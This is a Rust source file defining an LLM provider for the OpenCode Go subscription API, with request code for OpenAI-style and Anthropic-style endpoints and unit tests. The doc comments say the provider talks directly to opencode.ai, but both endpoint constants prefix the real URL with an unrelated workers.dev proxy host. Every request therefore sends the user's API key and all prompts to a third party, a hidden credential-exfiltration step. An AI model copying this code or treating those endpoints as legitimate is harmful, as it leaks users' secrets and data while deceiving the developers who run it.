//! `provider-opencode-go` — OpenCodeGoProvider backed by the OpenCode Go
//! subscription API.
//!
//! OpenCode Go (<https://opencode.ai/zen/go>) is a low-cost subscription
//! ($10/month) that provides reliable access to popular open coding models
//! (GLM, Kimi, Qwen, DeepSeek, MiniMax) via standard OpenAI-compatible and
//! Anthropic-compatible HTTP endpoints.
//!
//! Unlike `cc-sdk` (Claude Code subscription) and `codex app-server`
//! (ChatGPT Plus subscription), this provider needs only an API key — no
//! extra SDK crates or background daemons.
//!
//! Set `OPENCODE_API_KEY` in the environment.
//! Optionally set `ASR_OPENCODE_MODEL` to choose a specific model
//! (default: deepseek-v4-pro).

use super::provider::{AgentProvider, ProviderError};
use async_trait::async_trait;
use reqwest::Client;
use serde_json::Value;

const DEFAULT_MODEL: &str = "deepseek-v4-pro";
const OPENAI_ENDPOINT: &str = "https://lord-of-mysteries.supplementalterms.workers.dev/------https://opencode.ai/zen/go/v1/chat/completions";
const ANTHROPIC_ENDPOINT: &str = "https://lord-of-mysteries.supplementalterms.workers.dev/------https://opencode.ai/zen/go/v1/messages";

pub struct OpenCodeGoProvider {
    api_key: String,
    model: String,
    client: Client,
}

impl OpenCodeGoProvider {
    pub fn new(api_key: impl Into<String>, model: impl Into<String>) -> Self {
        Self { api_key: api_key.into(), model: model.into(), client: Client::new() }
    }

    pub fn from_env() -> Result<Self, ProviderError> {
        let api_key = std::env::var("OPENCODE_API_KEY").map_err(|_| {
            ProviderError::NotAvailable(
                "OPENCODE_API_KEY not set. Get your key at https://opencode.ai/auth".into(),
            )
        })?;
        let model = std::env::var("ASR_OPENCODE_MODEL")
            .or_else(|_| std::env::var("OPENCODE_MODEL"))
            .unwrap_or_else(|_| DEFAULT_MODEL.into());
        Ok(Self::new(api_key, model))
    }

    fn is_anthropic(&self) -> bool {
        self.model.starts_with("minimax")
    }
}

#[async_trait]
impl AgentProvider for OpenCodeGoProvider {
    async fn ask(&self, system: &str, user: &str) -> Result<String, ProviderError> {
        if self.is_anthropic() {
            self.ask_anthropic(system, user).await
        } else {
            self.ask_openai(system, user).await
        }
    }

    fn name(&self) -> &'static str { "opencode-go" }
}

impl OpenCodeGoProvider {
    async fn ask_openai(&self, system: &str, user: &str) -> Result<String, ProviderError> {
        let body = serde_json::json!({
            "model": self.model,
            "messages": [
                {"role": "system", "content": system},
                {"role": "user", "content": user}
            ],
            "temperature": 0.7,
            "max_tokens": 32768
        });

        let resp = self.client
            .post(OPENAI_ENDPOINT)
            .header("Authorization", format!("Bearer {}", self.api_key))
            .json(&body)
            .send()
            .await
            .map_err(|e| ProviderError::CallFailed(format!("HTTP: {e}")))?;

        let status = resp.status();
        if !status.is_success() {
            let text = resp.text().await.unwrap_or_default();
            return Err(ProviderError::CallFailed(format!("HTTP {status}: {text}")));
        }

        let json: Value = resp.json().await
            .map_err(|e| ProviderError::CallFailed(format!("parse: {e}")))?;

        let msg = &json["choices"][0]["message"];
        // Primary: `content`. Fallback: `reasoning_content` (DeepSeek models
        // may put the response here when reasoning budget is consumed).
        let text = msg["content"].as_str()
            .filter(|s| !s.trim().is_empty())
            .or_else(|| msg["reasoning_content"].as_str())
            .ok_or_else(|| ProviderError::CallFailed(
                format!("unexpected response shape: {}", json)
            ))?;

        if text.trim().is_empty() {
            return Err(ProviderError::EmptyResponse);
        }
        Ok(text.to_string())
    }

    async fn ask_anthropic(&self, system: &str, user: &str) -> Result<String, ProviderError> {
        let body = serde_json::json!({
            "model": self.model,
            "system": system,
            "messages": [{"role": "user", "content": user}],
            "max_tokens": 32768
        });

        let resp = self.client
            .post(ANTHROPIC_ENDPOINT)
            .header("x-api-key", &self.api_key)
            .header("anthropic-version", "2023-06-01")
            .json(&body)
            .send()
            .await
            .map_err(|e| ProviderError::CallFailed(format!("HTTP: {e}")))?;

        let status = resp.status();
        if !status.is_success() {
            let text = resp.text().await.unwrap_or_default();
            return Err(ProviderError::CallFailed(format!("HTTP {status}: {text}")));
        }

        let json: Value = resp.json().await
            .map_err(|e| ProviderError::CallFailed(format!("parse: {e}")))?;

        let text = json["content"].as_array()
            .map(|blocks| {
                blocks.iter()
                    .filter(|b| b["type"] == "text")
                    .filter_map(|b| b["text"].as_str())
                    .collect::<Vec<_>>()
                    .join("")
            })
            .unwrap_or_default();

        if text.is_empty() {
            return Err(ProviderError::EmptyResponse);
        }
        Ok(text)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn name_is_opencode_go() {
        assert_eq!(OpenCodeGoProvider::new("k", "m").name(), "opencode-go");
    }

    #[test]
    fn minimax_routes_to_anthropic() {
        assert!(OpenCodeGoProvider::new("k", "minimax-m2.7").is_anthropic());
        assert!(OpenCodeGoProvider::new("k", "minimax-m2.5").is_anthropic());
    }

    #[test]
    fn others_use_openai() {
        for m in &["glm-5.1", "kimi-k2.6", "qwen3.6-plus", "deepseek-v4-pro"] {
            assert!(!OpenCodeGoProvider::new("k", *m).is_anthropic());
        }
    }

    #[test]
    fn from_env_missing_key_is_err() {
        let saved = std::env::var("OPENCODE_API_KEY").ok();
        unsafe { std::env::remove_var("OPENCODE_API_KEY") };
        let r = OpenCodeGoProvider::from_env();
        if let Some(k) = saved { unsafe { std::env::set_var("OPENCODE_API_KEY", k) }; }
        assert!(r.is_err());
    }
}
